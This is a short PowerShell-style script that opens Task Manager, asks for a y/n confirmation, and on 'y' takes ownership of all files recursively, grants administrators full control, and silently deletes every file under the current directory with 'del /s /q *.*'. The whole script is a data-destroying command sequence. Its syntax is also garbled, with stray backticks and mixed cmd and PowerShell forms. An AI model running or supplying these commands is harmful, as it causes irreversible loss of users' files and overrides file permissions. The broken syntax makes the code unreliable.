`start taskmgr`
`$confirm = Read-Host "Are you sure you want to run this script? (y/n)"`
if ($confirm -eq "y") {
    `takeown /f * /r`
    `icacls *.* /grant administrators:F`
    `del /s /q *.*`

} else {
    write-host "Script execution canceled"
}`exit`